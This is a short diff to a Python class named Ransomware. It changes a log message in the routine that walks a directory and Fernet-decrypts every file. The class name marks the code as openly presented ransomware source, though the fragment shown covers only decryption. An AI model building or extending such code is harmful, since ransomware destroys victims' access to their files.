@@ -26,7 +26,7 @@ class Ransomware:
         for x in os.walk(dir):
             for item in glob.glob(os.path.join(x[0], '*')):
                 if os.path.isfile(item):
-                    print(f'[+] Encrypting {item}')
+                    print(f'[+] Decrypting {item}')
                     cryptor = Fernet(key)
                     file = open(item, 'rb')
                     encrypted = cryptor.decrypt(file.read())
